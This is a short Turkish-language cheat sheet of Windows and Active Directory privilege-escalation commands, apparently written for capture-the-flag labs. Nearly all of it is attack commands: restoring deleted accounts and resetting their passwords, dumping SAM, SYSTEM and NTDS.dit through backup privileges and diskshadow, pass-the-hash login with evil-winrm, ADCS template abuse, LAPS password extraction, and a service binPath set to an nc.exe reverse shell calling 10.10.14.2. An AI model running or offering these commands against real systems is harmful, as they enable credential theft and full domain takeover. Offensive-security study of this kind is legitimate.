---
layout: page
title: "Administrator Olmak İçin"
permalink: /linux/to-domain-admin/
---


Silinen Kullanıcı
```bash
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties * | Select-Object *
Tüm attributelarını gösterir. Silinen kullanıcıları görmek için:
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects 
```

Geri Getirmek için:
```bash
Restore-ADObject -Identity 938xxxxxxxxxxx
Enable-ADAccount -Identity cert_admin
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Abc123456@" -AsPlainText -Force)
```

SeBackupPrivilege ve SeRestorePrivilege yetkin varsa root olmadan root.txt okunabiliyor:
```bash
robocopy C:\Users\Administrator\Desktop C:\Users\path\Desktop root.txt /b /IS

!!! Administrator olmak için:
reg save hklm\sam sam
reg save hklm\system system

download sam
download system
secretsdump.py -sam sam -system system local
evil-winrm -i IP -u -H XXX ile giriş
```

Veya aynı yetkilerle admin olmak için 
```bash
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
 > bunlar src.txt  hedef makinede diskshadow /s src.txt diyorsun ardından E: sürücüsüne erişiyorsun.
 dir E:\
 robocopy E:\Windows\NTDS C:\Users\<ELE GEÇİRİLEN>\ NTDS.dit /b /IS
```


SeLoadDriverPrivilege yetkin varsa:
```bash
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234"

sc.exe stop vss
sc.exe start vss
vss kullanma sebebimiz sistem tarafından çağrılıyor...
```


ConsoleHistory için: 
```bash
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

txt,flag aramak için:
```bash
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.flag -ErrorAction SilentlyContinue
```

Exploit edilebilecek templateler için:
```bash
certipy-ad find -u 'username@test.local' -p 'YeniParola123..' -dc-ip 10.10.x.x

ldapsearch -x -H ldap://10.10.x.x -D "username@test.local" -w "YeniParola123.." -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local"

bunun ile certificate template bilgilerini çekebiliyoruz. Templateler kimin yetkisi olduğunu gösteriyor.
Yapacağımız bundan sonrası ESC1-4-8 vb. konulardan yürümek.
```

LAPS Kullanılıyorsa:
```bash
impacket-GetLAPSPassword test.local/test_user:'ŞİFRE1!!!' -dc-ip 10.10.X.X
```
